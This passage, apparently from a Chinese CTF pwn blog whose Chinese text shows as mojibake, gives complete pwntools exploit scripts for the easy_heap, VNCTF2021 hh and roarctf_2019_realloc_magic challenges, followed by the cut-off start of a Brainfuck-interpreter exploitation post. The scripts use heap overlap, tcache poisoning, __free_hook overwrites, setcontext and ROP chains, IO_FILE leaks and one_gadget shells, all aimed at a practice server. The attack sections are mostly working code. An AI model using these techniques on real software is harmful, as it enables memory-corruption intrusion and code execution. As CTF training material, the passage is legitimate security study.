                                                             </p><p>å®Œæ•´çš„exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;easy_heap&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#p = process(&#x27;./easy_heap&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27074</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br>add(<span class="hljs-number">0x410</span>)<br>add(<span class="hljs-number">0x10</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x420</span>)<span class="hljs-comment">#æœ¬æ¥æ˜¯æƒ³é€šè¿‡large chunkä¸€æ¬¡æ€§æ³„æ¼libcåœ°å€å’Œå †åœ°å€, ä½†editä¼šå¼•å…¥&#x27;\x00&#x27;ï¼Œæœ€åæ”¹ä¸ºtcacheæ³„æ¼å †åœ°å€</span><br>add(<span class="hljs-number">0x130</span>)<br>show(<span class="hljs-number">2</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">1104</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><br>add(<span class="hljs-number">0x10</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0x18</span>)<br>show(<span class="hljs-number">1</span>)<span class="hljs-comment">#é‡æ–°ç”³è¯·åtcacheæŒ‡é’ˆä¾ç„¶æ®‹ç•™ï¼Œè¿›è€Œæ³„æ¼å †åœ°å€</span><br>p.recvuntil(<span class="hljs-string">b&#x27;Content: &#x27;</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x6c0</span><br><br>add(<span class="hljs-number">0x110</span>)<br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0xf0</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>)<br>edit(<span class="hljs-number">3</span>, payload1)<br>payload2 = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x20</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x131</span>) + p64(heap_addr + <span class="hljs-number">0x2a0</span>) + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">2</span>, payload2)<span class="hljs-comment">#ä¼ªé€ å †å—</span><br>payload3 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0x130</span>)<br>edit(<span class="hljs-number">1</span>, payload3)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0xf0</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>, <span class="hljs-number">11</span>):<br>    delete(i)<br>delete(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0x10</span>)<br>delete(<span class="hljs-number">4</span>)<br>delete(<span class="hljs-number">5</span>)<br><br>free_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>magic_gadget = libcbase + <span class="hljs-number">0x154b90</span><br>pop_rdi = libcbase + <span class="hljs-number">0x26bb2</span><br>pop_rsi = libcbase + <span class="hljs-number">0x2709c</span><br>pop_rdx_r12 = libcbase + <span class="hljs-number">0x11c421</span><br>ret = libcbase + <span class="hljs-number">0x256b9</span><br>mprotect = libcbase + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br><br>edit(<span class="hljs-number">1</span>, p64(free_hook))<br>add(<span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">5</span>, p64(magic_gadget))<br><br>payload = p64(<span class="hljs-number">0</span>) + p64(heap_addr + <span class="hljs-number">0x6e0</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(setcontext + <span class="hljs-number">61</span>)<br>payload = payload.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(heap_addr + <span class="hljs-number">0x6e0</span> + <span class="hljs-number">0x100</span>) + p64(ret)<br>payload = payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(pop_rdi) + p64(heap_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0x1000</span>) + p64(pop_rdx_r12) + p64(<span class="hljs-number">7</span>) + p64(<span class="hljs-number">0</span>) + p64(mprotect)<br>payload += p64(heap_addr + <span class="hljs-number">0x6e0</span> + <span class="hljs-number">0x150</span>)<br>payload = payload.ljust(<span class="hljs-number">0x150</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += asm(shellcraft.cat(<span class="hljs-string">&#x27;flag&#x27;</span>))<br><br>edit(<span class="hljs-number">0</span>, payload)<br>delete(<span class="hljs-number">0</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>â€‹                                                                 </p><p>â€‹                                                                                        </p><h3 id="VNCTF2021-hh"><a href="#VNCTF2021-hh" class="headerlink" title="VNCTF2021 hh"></a>VNCTF2021 hh</h3><p>vmpwnç±»å‹çš„é¢˜ï¼ŒæŒ‡ä»¤å’Œæ“ä½œæ•°éƒ½æ˜¯4ä¸ªå­—èŠ‚ï¼Œä¸»è¦ä½¿ç”¨å¦‚ä¸‹æŒ‡ä»¤ï¼š</p><img src="/img/8/Screenshot_20230101_041533.png" style="zoom:67%;" /><p>â€‹</p><p>åˆ©ç”¨æ€è·¯ï¼š</p><ol><li>v32å­˜åœ¨äºæ ˆä¸Šï¼Œæ‰§è¡ŒæŒ‡ä»¤<code>0xb  n</code>æ—¶ä¼šé€ æˆæ•°ç»„è¶Šç•Œï¼Œå¯ä»¥å°†æ ˆä¸Šå…¶å®ƒçš„å†…å®¹å†™å…¥v32æ•°ç»„ï¼Œå†é…åˆæŒ‡ä»¤<code>0xe</code>å°±å¯ä»¥æ³„æ¼æ ˆåœ°å€å’Œ<code>__libc_start_main</code>åœ°å€ï¼›</li><li>æŒ‡ä»¤<code>0x9  n</code>å¯ä»¥åœ¨v32æ•°ç»„ä¸Šå†™å…¥ä»»ä½•æ•°ï¼Œå†é…åˆæŒ‡ä»¤<code>0xd  n</code>ï¼ŒåŒæ ·æ˜¯æ•°ç»„è¶Šç•Œå°†v32æ•°ç»„çš„å†…å®¹å†™å…¥åˆ°æ ˆä¸Šå…¶å®ƒåœ°æ–¹ï¼Œå½“ç„¶è¿™é‡Œç›´æ¥å†™å…¥å‡½æ•°è¿”å›åœ°å€ï¼Œæ‰§è¡ŒROPã€‚</li></ol><p>â€‹                                                            </p><p>å®Œæ•´expå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;hh&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">27244</span>)<br><span class="hljs-comment">#p = process(&#x27;./hh&#x27;)</span><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sendgadget</span>(<span class="hljs-params">gadget</span>):<br>    l = <span class="hljs-built_in">len</span>(gadget) // <span class="hljs-number">4</span><br>    gadget = <span class="hljs-built_in">int</span>.from_bytes(gadget, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>, signed=<span class="hljs-literal">True</span>)<br>    result = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>        t = gadget &amp; <span class="hljs-number">0xffffffff</span><br>        result += p32(<span class="hljs-number">9</span>) + p32(t) + p32(<span class="hljs-number">0xd</span>) + p32(<span class="hljs-number">0x7d6</span> + i)<br>        gadget = gadget &gt;&gt; <span class="hljs-number">32</span><br>    <span class="hljs-keyword">return</span> result<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;choice :&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>code = p32(<span class="hljs-number">11</span>) + p32(<span class="hljs-number">0x7d4</span>) + p32(<span class="hljs-number">11</span>) + p32(<span class="hljs-number">0x7d5</span>) + p32(<span class="hljs-number">11</span>) + p32(<span class="hljs-number">0x7d6</span> + <span class="hljs-number">8</span>) + p32(<span class="hljs-number">11</span>) + p32(<span class="hljs-number">0x7d7</span> + <span class="hljs-number">8</span>)<br>code += p32(<span class="hljs-number">0xe</span>) * <span class="hljs-number">4</span><br>p.sendafter(<span class="hljs-string">b&#x27;code:&#x27;</span>, code)<br>p.sendlineafter(<span class="hljs-string">b&#x27;choice :&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>leak1 =  <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>) &lt;&lt; <span class="hljs-number">32</span><br>leak2 = leak1 + <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br>leak3 =  <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>) &lt;&lt; <span class="hljs-number">32</span><br>stack = leak3 + <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br>libcbase = leak2  - <span class="hljs-number">240</span> - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>pop_rdi = libcbase + <span class="hljs-number">0x21112</span><br>pop_rsi = libcbase + <span class="hljs-number">0x202f8</span><br>pop_rdx = libcbase + <span class="hljs-number">0x1b92</span><br>pop_rax = libcbase + <span class="hljs-number">0x3a738</span> <br>ret = libcbase + <span class="hljs-number">0x937</span><br>syscall_ret = libcbase + <span class="hljs-number">0xbc3f5</span><br><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;choice :&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>payload = flat(<br>    p64(pop_rdi), p64(stack + <span class="hljs-number">0xb0</span>),<br>    p64(pop_rsi), p64(<span class="hljs-number">0</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">2</span>),<br>    p64(syscall_ret),<br><br>    p64(pop_rdi), p64(<span class="hljs-number">3</span>),<br>    p64(pop_rsi), p64(stack + <span class="hljs-number">0x100</span>),<br>    p64(pop_rdx), p64(<span class="hljs-number">0x30</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">0</span>),<br>    p64(syscall_ret),<br><br>    p64(pop_rdi), p64(<span class="hljs-number">1</span>),<br>    p64(pop_rsi), p64(stack + <span class="hljs-number">0x100</span>),<br>    p64(pop_rdx), p64(<span class="hljs-number">0x30</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">1</span>),<br>    p64(syscall_ret)<br>)<br>payload += <span class="hljs-string">b&#x27;flag&#x27;</span><br>code = sendgadget(payload)<br>p.sendafter(<span class="hljs-string">b&#x27;code:&#x27;</span>, code)<br>p.sendlineafter(<span class="hljs-string">b&#x27;choice :&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="roarctf-2019-realloc-magic"><a href="#roarctf-2019-realloc-magic" class="headerlink" title="roarctf_2019_realloc_magic"></a>roarctf_2019_realloc_magic</h3><p>Roderickå¸ˆå‚…çš„<a href="https://roderickchan.github.io/2021/03/28/roarctf-2019-realloc-magic/">è¿™ç¯‡</a>å·²ç»å†™å¾—å¾ˆå¥½äº†ï¼Œè¿˜éœ€è¦æ³¨æ„çš„æ˜¯ä½¿ç”¨reallocå‡½æ•°ï¼Œåœ¨æ‰©å¤§å†…å­˜æ—¶ï¼Œå¹¶ä¸”tcacheä¸­æ­£å¥½æœ‰è¯¥å¤§å°çš„chunkï¼Œè¿™æ—¶ä¹Ÿå¹¶ä¸ä¼šå»ä½¿ç”¨tcacheä¸­çš„chunkã€‚</p><p>â€‹                         </p><p>è‡ªå·±å¤ç°çš„exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;roarctf_2019_realloc_magic&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#p = process(&#x27;./roarctf_2019_realloc_magic&#x27;)</span><br><span class="hljs-keyword">global</span> p<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">realloc</span>(<span class="hljs-params">size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size?&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    <span class="hljs-keyword">if</span> size != <span class="hljs-number">0</span>:<br>        p.sendafter(<span class="hljs-string">b&#x27;Content?&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    realloc(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        free()<br>    realloc(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x81</span>) + <span class="hljs-string">b&#x27;\x60\xc7&#x27;</span>)<br>    realloc(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x80</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    leak =  u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>, timeout=<span class="hljs-number">1</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    libcbase = leak - <span class="hljs-number">4118704</span><br>    free_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    onegadget = libcbase + <span class="hljs-number">0x4f322</span><br><br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;666&#x27;</span>)<br>    realloc(<span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>        free()<br>    realloc(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x30</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x81</span>) + p64(free_hook))<br>    realloc(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x80</span>, p64(onegadget))<br>    free()<br>    p.interactive()<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span> :<br>        p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28369</span>)<br>        pwn()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        p.close()<br></code></pre></td></tr></table></figure><p>â€‹                                                 </p><p>â€‹                                            </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>bfè§£é‡Šå™¨</title>
    <link href="/2022/12/12/bf%E8%A7%A3%E9%87%8A%E5%99%A8/"/>
    <url>/2022/12/12/bf%E8%A7%A3%E9%87%8A%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘åœ¨å¼ºç½‘æ‹Ÿæ€å’Œå®‰æ´µæ¯ä¸Šéƒ½å‡ºç°äº†bfè§£é‡Šå™¨çš„é¢˜ï¼Œè‡ªå·±è¿˜æ˜¯å¤´ä¸€å›è§ï¼Œåœ¨æ­¤å­¦ä¹ ä¸€ä¸‹ã€‚</p><p>Brainfuckï¼Œç®€ç§°BFï¼Œæ˜¯ä¸€ç§æå°åŒ–çš„ç¨‹åºè¯­è¨€</p><img src="/img/7/Screenshot_20221230_014458.png" style="zoom: 67%;" /><h3 id="pwnable-bf"><a href="#pwnable-bf" class="headerlink" title="pwnable_bf"></a>pwnable_bf</h3><p>é¦–å…ˆçœ‹ä¸€é“pwnable_bfï¼ˆbuuå’Œpwnable.krä¸Šéƒ½æœ‰ï¼‰</p><p>å…¶ä¸»å‡½æ•°ä¸­å…¨å±€å˜é‡pæŒ‡å‘å…¨å±€å˜é‡tapeçš„åœ°å€ï¼Œè¾“å…¥ä¸€æ®µå­—ç¬¦åå°±è®©æ¯ä¸ªå­—ç¬¦è¿›å…¥do_brainfuckå‡½æ•°ï¼š</p><img src="/img/7/Screenshot_20221230_014948.png" style="zoom: 80%;" /><p>â€‹                                  </p><p>åœ¨do_brainfuckå‡½æ•°ä¸­å°±æ˜¯å¯¹æŒ‡é’ˆpçš„æ“ä½œï¼Œæ¯ä¸€ä¸ªå­—ç¬¦å®é™…ä¸Šå°±å¯¹åº”äº†bfè§£é‡Šå™¨çš„æ“ä½œï¼›æ¼æ´ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œå°±æ˜¯æŒ‡é’ˆpå¯¹åº”tapeçš„åœ°å€çš„å˜åŒ–æ²¡æœ‰åšå‡ºé™åˆ¶ï¼Œè¿™å°±è®©æŒ‡é’ˆpæŒ‡å‘gotè¡¨ï¼š</p><img src="/img/7/Screenshot_20221230_015016.png" style="zoom: 80%;" /><p>â€‹                                                        </p><p>æ³„æ¼åœ°å€libcåœ°å€åå¯ä»¥ç»§ç»­ä½¿ç”¨çš„å°±åªæœ‰putcharå‡½æ•°å’Œgetcharå‡½æ•°ï¼Œç”±äºå¯¹gotè¡¨çš„è¯»å†™éƒ½åªèƒ½æ˜¯ä¸€å­—èŠ‚ï¼Œgetcharå‡½æ•°å¯¹è‡ªå·±çš„gotè¡¨ä¿®æ”¹åˆ°ä¸€åŠå°±ä¼šå…ˆå¤±æ•ˆï¼Œæ‰€ä»¥åªèƒ½ä¿®æ”¹putcharå‡½æ•°çš„gotè¡¨ï¼›è€Œputcharå‡½æ•°çš„å‚æ•°åªèƒ½æ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œæ— æ³•å®Œæˆâ€&#x2F;bin&#x2F;shâ€çš„è°ƒç”¨ï¼Œæ‰€ä»¥ä¿®æ”¹putcharå‡½æ•°ä¸º_startã€memsetå‡½æ•°ä¸ºgetså‡½æ•°ã€fgetså‡½æ•°ä¸ºsystemå‡½æ•°å³å¯ã€‚</p><p>å®Œæ•´çš„exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;bf&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc-2.23.so&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./bf&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">25595</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getchar</span>(<span class="hljs-params">gadget</span>):<br>    l = <span class="hljs-built_in">len</span>(gadget)<br>    gadget = <span class="hljs-built_in">int</span>.from_bytes(gadget, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>, signed=<span 